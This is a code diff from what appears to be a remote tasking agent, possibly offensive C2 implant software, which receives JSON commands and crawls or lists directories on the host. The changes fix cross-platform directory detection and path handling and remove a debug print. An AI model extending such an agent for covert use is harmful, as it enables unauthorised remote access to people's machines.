@@ -178,7 +178,6 @@ size_t get_file_size(char *filename){
 
 void get_all_files(char *dirname, queue *files){
   
-  printf("[*] Crawling: %s\n", dirname);
   struct dirent *file;
   DIR *dir = opendir(dirname);
   if (!dir)
@@ -196,12 +195,22 @@ void get_all_files(char *dirname, queue *files){
     file_path[strlen(file_path)] = '/';
     #endif
     strncpy(file_path + strlen(file_path), file->d_name, 4095 - strlen(file_path));
+    short is_dir = 0;
+    #ifdef IS_LINUX
     if (file->d_type == DT_DIR){ // Entry is a directory. Recurse.
       get_all_files(file_path, files);
+      is_dir = 1;
     }
+    #else
+    DWORD attrs = GetFileAttributesA(file_path);
+    if ((attrs != INVALID_FILE_ATTRIBUTES) && (attrs & FILE_ATTRIBUTE_DIRECTORY)){ // Entry is a directory. Recurse.
+      get_all_files(file_path, files);
+      is_dir = 1;
+    }
+    #endif
     file_entry *entry = malloc(sizeof(file_entry));
     entry->filename = file_path;
-    entry->file_type = file->d_type != DT_DIR ? 0 : 1;
+    entry->file_type = is_dir;
     if (entry->file_type == 0)
       entry->file_size = get_file_size(entry->filename);
     else
@@ -1716,18 +1725,31 @@ DWORD WINAPI task_executor(LPVOID ptr)
   }else if (!strcmp(tsk->type, cmd_strs[17])){ // List a directory
     cJSON *entries = cJSON_CreateArray();
     struct dirent *file;
-    DIR *dir = opendir(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "dir")));
+    char *target_dir = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "dir"));
+    DIR *dir = opendir(target_dir);
     if (!dir){
       cJSON_Delete(entries);
       goto complete;
     }
     while ((file = readdir(dir)) != NULL){
+      char *full_path = malloc(strlen(target_dir) + strlen(file->d_name) + 2);
+      strncpy(full_path, target_dir, strlen(target_dir) + 1);
+      #ifdef IS_LINUX
+      strncat(full_path, "/", 2);
+      strncat(full_path, file->d_name, strlen(file->d_name) + 1);
       int file_type = (file->d_type != DT_DIR ? 0 : 1);
+      #else
+      strncat(full_path, "\\", 2);
+      strncat(full_path, file->d_name, strlen(file->d_name) + 1);
+      DWORD attrs = GetFileAttributesA(full_path);
+      int file_type = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) ? 1 : 0; 
+      #endif
       cJSON *entry = cJSON_CreateArray();
       cJSON_AddItemToArray(entry, cJSON_CreateNumber(file_type));
-      cJSON_AddItemToArray(entry, cJSON_CreateNumber(file_type == 0 ? get_file_size(file->d_name) : 0));
+      cJSON_AddItemToArray(entry, cJSON_CreateNumber(file_type == 0 ? get_file_size(full_path) : 0));
       cJSON_AddItemToArray(entry, cJSON_CreateString(file->d_name));
       cJSON_AddItemToArray(entries, entry);
+      free(full_path);
     }
     closedir(dir);
     char *files_str = cJSON_PrintUnformatted(entries);
